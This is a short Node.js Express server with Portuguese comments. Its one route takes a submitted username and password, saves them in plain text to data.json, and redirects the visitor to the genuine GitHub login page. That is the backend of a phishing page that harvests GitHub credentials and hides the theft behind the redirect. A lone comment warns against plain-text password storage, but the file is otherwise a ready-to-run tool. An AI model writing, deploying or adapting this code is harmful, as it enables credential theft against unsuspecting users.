const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para analisar o corpo das requisições em formato URL-encoded e JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Rota que recebe os dados do formulário e salva em um arquivo JSON
app.post('/submit-form', (req, res) => {
    const { username, password } = req.body;
    const filePath = path.join(__dirname, 'data.json');

    // Cria um objeto com os dados recebidos
    const data = {
        username,
        password // Aviso: Não armazene senhas em texto puro em uma aplicação real.
    };

    // Escreve os dados no arquivo data.json
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
        if (err) {
            console.error('Erro ao salvar os dados:', err);
            res.status(500).send('Erro ao processar os dados.');
            return;
        }

        // Se não houver erro, redireciona para a página de login do GitHub
        res.redirect('https://github.com/login');
    });
});

// Inicia o servidor na porta especificada
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
